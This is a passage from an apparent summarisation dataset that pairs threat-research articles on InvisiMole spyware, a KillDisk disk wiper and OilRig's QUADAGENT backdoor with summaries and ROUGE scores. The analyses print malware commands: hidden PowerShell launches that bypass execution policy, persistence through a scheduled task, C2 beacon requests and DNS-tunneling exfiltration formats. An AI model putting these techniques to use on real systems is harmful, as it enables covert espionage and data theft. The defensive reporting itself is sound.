operations. Whenever possible, it tries to hide its activities.For instance, the malware sniffs around interesting places on the system, reads recent documents or even modifies some files. This leaves traces on the system and could raise the victim's suspicions as the time of the last access or modification of the files is changed with each such activity. To prevent this, the malware always restores the original file access or modification times, so that the user is unaware of its operation.Another example of how the malware authors attempt to act covertly is the way they treat traces left on the disk. The malware collects loads of sensitive data, which are then temporarily stored in files and deleted after they have been successfully uploaded to the C&C servers. Even the deleted files can, however, be recovered by an experienced system administrator, which could help further investigation of the attack - after the victim becomes aware of it. This is possible due to the fact that some data still reside on a disk even after a file is deleted. To prevent this, the malware has the ability to safe-delete all the files, which means it first overwrites the data in a file with zeroes or random bytes, and only then is the file deleted.Internal storageThe backdoor configuration and the data collected are stored in one of two places - a working directory and working registry keys. A substantial portion of the backdoor command set is dedicated to manipulating these storage locations and their contents.The location of the working directory is determined by the instructions from the remote server. The directory is used as temporary storage for files containing collected data about the compromised computer. Such files share a common naming convention, encryption algorithm and structure. They are encrypted by a simple variation of the XOR cipher which is used across the malware components. The type of the file can be derived from the 4-byte control sequences placed at the beginning of the file.Besides being a storehouse for the gathered data, the working directory is also home to a copy of the legitimate WinRAR.exe application. This is copied by the malware and abused by the attackers for compressing the data that are to be exfiltrated.The working registry keys store configuration data, as well as a list of files in the working directory. The data are packed using a Zlib routine implemented in the malware binary and encrypted with the same cipher as the internal files.Subdirectory name File name Control sequences File content \ ~mrc_%random%.tmp 932101DA Audio recordings \ ~src_%random%.tmp 958901DA Audio recordings \ ~wbc_%random%.tmp 938901DA Webcam photos sc\ ~sc%random%.tmp DFE43A08 Screenshots ~zlp\ zdf_%random%.data B1CBF218 Zlib-compressed packages ~lcf\ tfl_%random% C0AFF208 Internal data fl_%timestamp%\strcn%num%\ fdata.dat A1CAF108 Data from removable drives fl_%timestamp%\strcn%num%\ index.dat BAAB0019 Data from removable drives Winrar\ WinRAR.exe - Copy of a legitimate application Winrar\ comment.txt - - Winrar\ descript.ion - - Winrar\ Default.SFX - - Winrar\ main.ico - -Backdoor commandsThe backdoor provides more than eighty commands that utilize the working directory and registry keys to store their intermediate results and configuration data. The graph of the backdoor interpreter is shown in Figure 8.Approximately a third of the commands are dedicated to reading and updating the configuration data stored in the registry. The rest of the commands are listed in the table below.Command ID(s) Command description 4 List information about files in a directory 6 Upload a file 20 List information about active processes 22 Terminate a process by ID 24 Execute a file 26 Delete a file 28 Get the IP forward table 30 Write data to a file 31 Sleep 38 List account information 40 List information about services on the system 42 List information about loaded drivers 43 Collect basic system information (computer name, OS version, memory status, local time, drive information, configured proxy information, system and process DEP policy...) 44 List installed software 46 List local users and session information 48 List applications accessed by users 52 Create a directory structure 78 Create a remote shell 81 Execute a command via a remote shell 91 Enable/disable UAC 93 Log off the user/shutdown/restart the system 101 Monitor and record changes in the specified directories 103 Delete directories 109 Turn the monitor on/off/onto standby 120 Capture screenshots of the display/active windows 126 Capture screenshots of the display/active windows & update configuration data 130 List information about resources on unmapped drives 132 Rename/move a file, modify create/access/write times of the file to the given values 134 List information about recently opened files 152 Disconnect (previously connected) remote drives 155 Create/delete a registry key, set/delete a registry key value, or enumerate registry values/keys/data 159, 161 Disable routing/firewall, create a proxy server on a specified port 172 Repeatedly display a dialog requesting the user to reboot the computer 175 Bypass UAC to manipulate a file 177 Create and write a file, set the create/access/modify times 181 Remove all system restore points 183 Drop (legitimate) WinRAR components 185 Add files to a password-protected archive (password = ""12KsNh92Dwd"") 187 Decrypt, unpack and load a DLL, load executables from its resources RC2CL, RC2FM 189 Create a system restore point 191 Extract a password-protected archive (12KsNh92Dwd) 193 Modify an encrypted file 195 Restart itself after the primary process finishes 197 Send 198 bytes of data hardcoded in the sample 199 Rename/move a file 206 Decrypt, unpack and load a DLL, load executables from its resources RC2CL, RC2FM 211 Upload collected information (captured screenshots, audio recordings, etc.) 213 List information about active windows 218 API for recording input audio devices 220 API for capturing webcam photos 224 List files executed with each system start 226 List information about enabled wireless networks (MAC address, SSID, beacon interval) 228 Drop a Zlib-compressed packageConclusionInvisiMole is fully-equipped spyware whose rich capabilities can surely compete with other espionage tools seen in the wild.We can only wonder why the authors decided to use two modules with overlapping capabilities. One might think the smaller module, RC2FM, is used as an initial reconnaissance tool, while the bigger RC2CL module is only run on interesting targets. This is, however, not the case - both of the modules are launched simultaneously. Another possible explanation is that the modules might have been crafted by various authors and then bundled together to provide the malware operators a more complex range of functionalities.The malware uses only a few techniques to avoid detection and analysis, yet, deployed against a very small number of high-value targets, it was able to stay under the radar for at least five years.Indicators of Compromise (IoCs)A full and comprehensive list of IoCs, C&C servers, along with registry keys and values can be found on GitHub.Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";"InvisiMole is a sophisticated malware designed to spy on its victims and steal their secrets. The malware has a modular architecture, starting its journey with a wrapper DLL, and performing its activities using two other modules that are embedded in its resources. Both of the modules are featurerich backdoors, which together give it the ability to gather as much information about the target as possible. Installation and persistence The first part of the malware we are looking at is a wrapper DLL, compiled with the Free Pascal Compiler. From our telemetry, we have observed that this DLL is placed in the Windows folder, masquerading as a legitimate mpr.dll library file with a forged version info resource. We have not seen a wrapper DLL named differently; however, there are hints in the DLL code that it might be also named fxsst.dll or winmm.dll. The first way in which the malware can be launched is by hijacking a DLL. Being placed in the same folder as explorer.exe, the wrapper DLL is loaded during the Windows startup into the Windows Explorer process instead of the legitimate library located in the %windir%\system32 folder. We have found both 32bit and 64bit versions of the malware, which makes this persistence technique functional on both architectures. As an alternative to DLL hijacking, other loading and persistence methods are possible. The wrapper DLL exports a function called GetDataLength. When this function is called, the DLL checks whether it was loaded by the rundll32.exe process with either explorer.exe or svchost.exe as its parent process, and only then does it launch the payload. This suggests other possible persistence methods by scheduling a task (i.e. having svchost.exe as a parent process) or by installation The ITSecurity report states that the malware is capable of remotely activating the microphone on the compromised computer and capturing sounds. The audio recordings are encoded to MP3 format using a legitimate lame.dll library, which is downloaded and misused by the malware. The malware also monitors all fixed and removable drives mapped on the local system. Whenever a new drive is inserted, it creates a list of all the files on the drive and stores it encrypted in a file. All of the collected data can ultimately be sent to the attackers, when the appropriate command is issued. Interestingly, there is an option in the RC2CL module to turn off its backdoor functionality and act as a proxy. In this case, the malware turns off the Windows firewall and creates a server that relays communication between a client and C&C server, or between two clients.Network communicationThe malware communicates with its C&C servers through a TCP socket. Messages sent from a client mimic the HTTP protocol, but note the invalid ""HIDE"" HTTP verb in the example in Figure 7.These requests comprise an identifier of the compromised PC, the request type, and encrypted data that are to be sent to the attackers, i.e. the results of the backdoor commands or appeals for further instructions.CapabilitiesDepending on the commands received, the backdoor can perform various actions on the infected computer. Common backdoors often support commands such as file system operations, file execution, registry key manipulation or remote shell activation. This spyware supports all of these instructions and a whole lot more its 84 commands provide the attackers with all they need to look at their victims more closely.The malware can inspect the infected computer and provide various data, from system information such as lists of active processes, running services, loaded drivers or available drives, to networking information, including the IP forward table and the speed of the internet connection.InvisiMole is capable of scanning enabled wireless networks on the compromised system. It records information such as the SSID and MAC address of the visible WiFi access points. These data can then be compared to public databases, letting the attackers track the geolocation of the victim.Other commands can provide information about the users of the compromised machine, their accounts and previous sessions.The software installed on the compromised computer is of particular interest. Which programs are installed on the system? Which of them are executed The ITSecurity report states that malware can create an elevated COM object and use it to delete or move files in locations that require admin rights. Additionally, the malware can remotely activate the victim's webcam and microphone and spy on the victim by taking pictures and recording sound. Screen activity can be monitored by capturing screenshots. Furthermore, one of the backdoor commands is used to replace the contents of drivers with the following names:blbdrive.syscompbatt.syssecdrv.sys We have not observed the attackers actually using this command but we can speculate that it does so to achieve additional persistence on 32bit systems. Though the backdoor is capable of interfering with the system (e.g. to log off a user, terminate a process or shut down the system), it mostly provides passive operations. Whenever possible, it tries to hide its activities. For instance, the malware sniffs around interesting places on the system, reads recent documents or even modifies some files. This leaves traces on the system and could raise the victim's suspicions as the time of the last access or modification of the files is changed with each such activity. To prevent this, the malware always restores the original file access or modification times, so that the user is unaware of its operation. Another example of how the malware authors attempt to act covertly is the way they treat traces left on the disk. The malware collects loads of sensitive data, which are then temporarily stored in files and deleted after they have been successfully uploaded to the C&C servers. Even the deleted files can, however, be recovered by an experienced system administrator, which could help further investigation of the attack after the victim becomes aware of it. This is possible due to the fact that some data still reside on a disk even after a file is deleted. Thank you for your input.";en;{'r': 0.4005212858384014, 'p': 0.9684873949579832, 'f': 0.5666871501322679};{'r': 0.33413078149920256, 'p': 0.945823927765237, 'f': 0.4938126066310509};{'r': 0.4005212858384014, 'p': 0.9684873949579832, 'f': 0.5666871501322679}
https://www.trendmicro.com/en_us/research/18/f/new-killdisk-variant-hits-latin-american-financial-organizations-again.html;KillDisk Variant Hits Latin American Finance Industry;"In January, we saw a variant of the disk-wiping KillDisk malware hitting several financial institutions in Latin America. One of these attacks was related to a foiled heist on the organization's system connected to the Society for Worldwide Interbank Financial Telecommunication's (SWIFT) network.Last May, we uncovered a master boot record (MBR)-wiping malware in the same region. One of the affected organizations was a bank whose systems were rendered inoperable for several days, thereby disrupting operations for almost a week and limiting services to customers. Our analysis indicates that the attack was used only as a distraction -- the end goal was to access the systems connected to the bank's local SWIFT network.The telltale sign was a problem related to the affected machine's boot sector. Based on the error message it displayed after our tests, we were able to ascertain that this was another -- possibly new -- variant of KillDisk. This kind of notification is common in systems affected by MBR-wiping threats and not in other malware types such as ransomware, which some people initially believed to be the culprit. Trend Micro products detect this threat as TROJ_KILLMBR.EE and TROJ_KILLDISK.IUE.The nature of this payload alone makes it difficult to determine if the attack was motivated by an opportunistic cybercriminal campaign or part of a coordinated attack like the previous attacks we observed last January.Figure 1. Error screen after the boot sector is overwrittenInitial analysisWe were able to source a sample that may be the malware involved in the May 2018 attacks. We ran it, and it broke the boot sector as expected (see Figure 1). An initial analysis of the file revealed it was created using Nullsoft Scriptable Install System (NSIS), an open-source application used to create setup programs. The actor behind this threat used the application and purposely named it ""MBR Killer."" Although the sample was protected by VMProtect (a virtualization protector used to defend against reverse engineering), we were still able to verify that it has a routine that wipes the first sector of the machine's physical disk, as shown in Figure 2. We haven't found any other new or notable routines in the sample we have. There is no evident command-and-control (C&C) infrastructure or communication, or ransomware-like routines coded into the sample. There are no indications of network-related behavior in this malware.Figure 2. The malware named ""MBR Killer"" (highlighted, top) and a code snippet showing its routine of wiping the disk's first sector (bottom)Figure 3. How the malware carries out its MBR-wiping routineHow the malware wipes the affected machine's diskThe malware was designed to wipe all the physical hard disks it can find in the infected system. Here's a summary of how it performs its MBR-wiping routine:It uses the application programming interface (API) CreateFileA to \\.\PHYSICALDRIVE0 to retrieve the handle of the hard disk. It overwrites the first sector of the disk (512 bytes) with ""0x00"". The first sector is the disk's MBR. It will try to perform the routines above (steps 1-2) on \\.\PHYSICALDRIVE1, \\.\PHYSICALDRIVE2, \\.\PHYSICALDRIVE3, and so on, as long as a hard disk is available. It will then force the machine to shut down via the API ExitWindows.When calling the APIs, the main executable will drop the component file %User Temp%/ns{5 random characters}.tmp/System.dll. The main executable will then load the dynamic-link library (DLL) file, which has the export function ""Call"" used to call for the APIs.Mitigation and best practicesThe destructive capabilities of this malware, which can render the affected machine inoperable, underscore the significance of defense in depth: arraying security to cover each layer of the organization's IT infrastructure, from gateways and endpoints to networks and servers. Here are some best practices that organizations can adopt to defend against this kind of threat:Trend Micro SolutionsTrend Micro(tm) XGen(tm) security provides a cross-generational blend of threat defense techniques against a full range of threats for data centers, cloud environments, networks, and endpoints. It features high-fidelity machine learning to secure the gateway and endpoint data and applications and protects physical, virtual, and cloud workloads. With capabilities like web/URL filtering, behavioral analysis, and custom sandboxing, XGen protects against today's purpose-built threats that bypass traditional controls and exploit known, unknown, or undisclosed vulnerabilities. Smart, optimized, and connected, XGen powers Trend Micro's suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense.Indicators of Compromise (IOCs)Related Hashes (SHA-256):";Trend Micro XGen security provides a crossgenerational blend of threat defense techniques against a full range of threats for data centers, cloud environments, networks, and endpoints. It features highfidelity machine learning to secure the gateway and endpoint data and applications and protects physical, virtual, and cloud workloads. With capabilities like web/URL filtering, behavioral analysis, and custom sandboxing, XGen protects against today's purposebuilt threats that bypass traditional controls and exploit known, unknown, or undisclosed vulnerabilities. Smart, optimized, and connected, XGen powers Trend Micro's suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense.;en;{'r': 0.17233009708737865, 'p': 0.9594594594594594, 'f': 0.292181067377263};{'r': 0.1261127596439169, 'p': 0.9139784946236559, 'f': 0.22164276188465196};{'r': 0.17233009708737865, 'p': 0.9594594594594594, 'f': 0.292181067377263}
https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/;OilRig Targets Technology Service Provider and Government Agency with QUADAGENT;"This post is also available in: ??? (Japanese)The OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region. We first discovered this group in mid-2016, although it is possible their operations extends earlier than that time frame. They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down. Examining their past behaviors with current events only seems to indicate that the OilRig group's operations are likely to accelerate even further in the near future.Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks.The targets in these attacks included a technology services provider as well as another government entity. Both these targets were in the same nation-state. Further, the attacks against these targets were made to appear to have originated from other entities in the same country. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks.The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as well. The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented. However, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently. Detailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog. QUADAGENT is the 12th custom built tool that Unit 42 has documented the OilRig group using for their attacks.Our analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other. Primarily, one used a Microsoft .NET Framework-based dropper that also opens a decoy dialog box, which can be seen in Figure 1. The other sample was a PE file generated via a bat2exe tool.SHA256 Filename PowerShell Filename Variant 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NETTable 1. QUADAGENT PE FilesThe QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only differences being the command and control server (C2) and randomized obfuscation. We were also able to locate a third delivery package of the QUADAGENT backdoor as reported by ClearSky Cyber Security. In their example, the OilRig group used a malicious macro document to deliver the backdoor, which is a tactic much more commonly used by them.A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation. This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses. Invoke-Obfuscation has proven to be highly effective at obfuscating PowerShell scripts and in this case, the adversary was able to take advantage of the tool for increased chances of evasion and as an anti-analysis tactic.Attack DetailsThis latest attack consisted of three waves between May and June 2018. All three waves involved a single spear phishing email that appeared to originate from a government agency based in the Middle East. Based on our telemetry, we have high confidence the email account used to launch this attack was compromised by the OilRig group, likely via credential theft.In the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were not easily discoverable via common search engines, indicating the targets were likely part of a previously collected target list, or possibly known associates of the compromised account used to send the attack emails. The malicious attachment was a simple PE file (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63) with the filename <redacted> Technical Services.exe. The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files. Its sole purpose here is to install the QUADAGENT backdoor and execute it.Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes. The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it. A scheduled task is also generated to maintain persistence of the payload. Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails.The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe. This PE was slightly different from the other attack, being compiled using the Microsoft .NET Framework instead of being generated via a bat2exe tool and containing a decoy dialog box as shown in Figure 1.Figure 1. Decoy dialog boxThe tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a method to reduce suspicion by the victim. In comparison to being silently run, a victim may be less suspicious of a dialog/error message because they are provided what appears to be a legitimate error response when attempting to open the attachment. When a file is silently run, because there is no response to the user's action, a victim may be more suspicious or curious on what actually happened.After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name. The C2 techniques remained identical, with the only change being the server which became cpuproc[.]com.Using rdppath[.]com as a pivot point, we collected an additional QUADAGENT sample also communicating to this C2 (SHA256: d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de), which was first reported by ClearSky Cyber Security. In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle. The use of malicious macro delivery documents is a tactic we have observed the OilRig group use repeatedly over the three years we've been tracking them. The actual QUADAGENT script payload used in the ClearSky sample was exactly the same as the one we found in the bat2exe version used against the aforementioned technical services provider. The delivery document also used a filename that could be related to other technology services or media organizations within that same nation state, although it is inconclusive. The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on ""Enable Content"" as seen in Figure 2. Unlike many other delivery documents used by this group, there was no additional decoy content after the macro was enabled.Figure 2. Lure image used to entice users to enable macrosUse of Open Source ToolsIn an attempt to avoid detection and as an anti-analysis tactic, the OilRig group abused an open source tool called Invoke-Obfuscation to obfuscate the code used for QUADAGENT. Invoke-Obfuscation is freely available via a Github repository and allows a user to change the visual representation of a PowerShell script simply by selecting the desired obfuscation techniques. Invoke-Obfuscation offers a variety of obfuscation techniques, and by analyzing the script we were able to ascertain the specific options in this attack. After identifying the specific options used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform additional analysis.We found two obfuscation techniques applied to the script: the first one changing the representation of variables, the second one changing the representation of strings in the script.Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell. Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex. ""{1}{0}"" -f 'bar','foo').During our analysis, we installed Invoke-Obfuscation and used it to obfuscate a previously collected QUADAGENT sample to confirm our analysis. We used the two previously mentioned obfuscation options within Invoke-Obfuscation on this QUADAGENT sample, which resulted in the generation of a very similar script as the Office365DCOMCheck.ps1 and SystemDiskClean.ps1 payloads delivered in the attacks discussed in this blog. We captured the commands we ran in Invoke-Obfuscation in the animation in Figure 3 below, which visualizes the steps the threat actor may have taken to create the payload delivered in this attack.Figure 3. Possible steps carried out in Invoke-Obfuscation on the QUADAGENT sampleConclusionThe OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication. In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls. A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished.Palo Alto Networks customers may learn more and are protected via the following ways:WildFire classifies QUADAGENT samples as maliciousQUADAGENT C2 Domains have been classified as maliciousAutoFocus customers can track QUADAGENT via its corresponding tagIOCsSHA256 HashesQUADAGENTd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63ThreeDollars1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9ccDomainsrdppath[.]comcpuproc[.]comacrobatverify[.]comFilenamesOffice365DCOMCheck.ps1Office365DCOMCheck.vbsSystemDiskClean.ps1SystemDiskClean.vbsAdobeAcrobatLicenseVerify.ps1c:\Users\<username>\AppData\Roaming\Out.jpgAppendixQUADAGENT Relationship to Other OilRig ToolsDuring our regular data gathering functions several months ago, we collected a delivery document (SHA256: 1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c) that contained an at-the-time an unknown payload which would be revealed to be QUADAGENT. While we do not have data supporting targeting information or telemetry, we know the document was created in January 2018 and likely used in an attack around that time frame. In addition, the delivery document shared metadata artifacts with the ThreeDollars delivery document (SHA256: 119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc) that OilRig used to deliver the ISMAgent payload in a targeted attack In January 2018 on a government entity in the Middle East.The QUADAGENT payload dropped by the delivery document had the filename AdobeAcrobatLicenseVerify.ps1 and used acrobatverify[.]comfor its C2. Examining the subdomains for acrobatverify[.]com reveals three subdomains, www, resolve, and dns. The passive DNS data for the subdomains shows an IP resolution of 185.162.235[.]121 from December 2017 through January 2018. Prior to this time period, we see several subdomains of msoffice-cdn[.]com, ns1, ns2, and www also resolving to this IP. This IP and msoffice-cdn[.]com were both previously referenced in our first report on an OilRig attack using the ThreeDollars delivery document.We used this QUADAGENT payload when testing the Invoke-Obfuscation tool mentioned in this blog. By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog.QUADAGENT AnalysisThe final payload delivered in all three attack waves is a PowerShell downloader referred to by other research organizations as QUADAGENT. The downloaders in these attacks were configured to use both rdppath[.]com and cpuproc[.]com as their C2 servers. When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order. For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request. If that HTTPS request is not successful, the downloader will issue an HTTP request. Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications. We provide more on the specific usage of these protocols as we discuss the inner workings of this malware in this section.The downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host. To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name (ex. Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:CreateObject(""WScript.Shell"").Run """" & WScript.Arguments(0) & """", 0, False 1 CreateObject ( ""WScript.Shell"" ) . Run """" & WScript . Arguments ( 0 ) & """" , 0 , FalseThe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. The task itself is fairly simple, calling the VBScript file which contains a PowerShell one-liner as an argument to run the QUADAGENT payload (ex. Office365DCOMCheck.ps1 and SystemDiskClean.ps1):wscript.exe ""Office365DCOMCheck.vbs"" \""PowerShell.exe -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>' \"" 1 wscript . exe ""Office365DCOMCheck.vbs"" \ "" PowerShell . exe - ExecutionPolicy bypass - WindowStyle hidden - NoProfile '<current PowerShell script>' \ ""After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as the following:HKCU\Office365DCOMCheckThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the C2 server. This registry key is empty upon the first execution of the payload. The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format:<session id>_<pre-shared key>To obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL:hxxps://www.rdppath[.]com/If the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL:hxxp://www.rdppath[.]com/The code to communicate with the C2 via HTTP exists within an exception handler. To trigger this, if the HTTPS requests do not work, the payload attempts to cause an exception by dividing 1 by 0. This exception invokes the exception handler containing the HTTP communication code, allowing it to run.If either attempt is successful, the C2 server will respond with the session ID and a pre-shared key in cleartext, which it will save to the previously mentioned registry key. The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie.If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling. To obtain the session ID and pre-shared key, the payload will issue a query to resolve the following domain:mail.<random number between 100000 and 999999>.<c2 name>This request notifies the C2 server that the payload is about to send system specific data as part of the initial handshake. The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:<domain>\<username>:passThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively).<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command. The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request's cookie in the PHPSESSID field, as seen in the example GET request:GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246 Host: www.rdppath[.]com Cookie: PHPSESSID=<c2 provided session id> Connection: Keep-Alive 1 2 3 4 5 GET / HTTP / 1.1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 , Win64 , x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 42.0.2311.135 Safari / 537.36 Edge / 12.246 Host : www . rdppath [ . ] com Cookie : PHPSESSID = < c2 provided session id > Connection : Keep - AliveIf the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling. The payload will issue a DNS query to the following domain to notify the C2 that it is about to send it data (session ID value) to it in a subsequent query:ns1.<random number between 100000 and 999999>.<c2 name>The payload does nothing with the C2 server's response to the query. Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:<encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers. The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>The payload will treat the data provided by the C2 as a message, which will have the following structure:hello<char uuid[35]><char type[1]><data>The message will start with the string hello followed by a 35-character UUID string. The type field specifies the command that the payload will handle. This specific variant of the payload can only handle one command type, x. The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key. The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script. Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task. It will run the newly downloaded PowerShell script by running the following command via cmd /c:wscript.exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>"" 1 wscript . exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>""The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload. It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful. The payload will construct a message that has the following structure that it will then send to the C2:bye<char uuid[35]>dThe message above is sent via a simple HTTPS/HTTP POST request to the C2 server. If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:ns1.<random number between 100000 and 999999>.<c2 name>The payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as:<encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name>The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:ns2.<same random number between 100000 and 999999>.<c2 name>Package Comparison of the QUADAGENT SamplesThe bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys. The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\Users\<username>\AppData\Roaming\Out.jpg. The batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command:@shift /0 rename Out.jpg Office365DCOMCheck.ps1 PowerShell -exec bypass -File .\Office365DCOMCheck.ps1 1 2 3 @ shift / 0 rename Out . jpg Office365DCOMCheck . ps1 PowerShell - exec bypass - File . \ Office365DCOMCheck . ps1The .NET variant (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) is even simpler. This dropper starts by displaying the dialog box in Figure 1, previously shown and discussed with the following 